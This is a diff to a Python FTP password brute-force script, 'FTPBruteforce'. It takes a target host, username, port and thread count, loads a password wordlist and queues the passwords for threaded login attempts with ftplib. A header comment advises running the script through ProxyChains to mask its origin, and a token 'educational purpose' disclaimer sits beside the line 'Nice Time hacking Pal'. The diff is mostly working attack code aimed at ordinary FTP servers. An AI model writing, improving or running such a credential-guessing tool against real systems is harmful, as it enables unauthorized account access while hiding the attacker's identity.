@@ -3,19 +3,23 @@
 Author: GiddySpurz
 Date:21/3/2020
 Name:FTPBruteforce
-Use ProxyChains
-Add Wordlist in line 59
+Use ProxyChains while executing this Script
+
 
 '''
-
+########################
 #This script is for Educational Purpose Only.
 #I will not be Liable for Wrong Use of this
 #Nice Time hacking Pal :-)
+########################
+
 import ftplib
 from threading import Thread
 import queue
 from colorama import Fore, init #for fancy colors,nothing else
 import sys
+import time
+
 
 print("FTPBrute Script")
 print("Written By GiddySpurz")
@@ -23,14 +27,14 @@ print("For Educational Purposes Only.")
 
 
 q = queue.Queue()
-n_threads = 256
 print("Input Host: ")
 host = input()
 print("Input Username: ")
 username = input()
 print("Enter The Port: (Default FTP Port 21)")
-port = input()
-
+port = int(input())
+print("n_threads: (Number of Threads,Use 10)")
+n_threads = int(input())
 
 def connect_ftp():
 	global q
@@ -58,7 +62,7 @@ def connect_ftp():
 			q.task_done()
 
 
-passwords = open("/usr/share/wordlists/nmap.lst").read().split("\n")
+passwords = open("wordlist.txt").read().split("\n")
 print("[+] Passwords to try:" ,len(passwords))
 for password in passwords:
 	q.put(password)
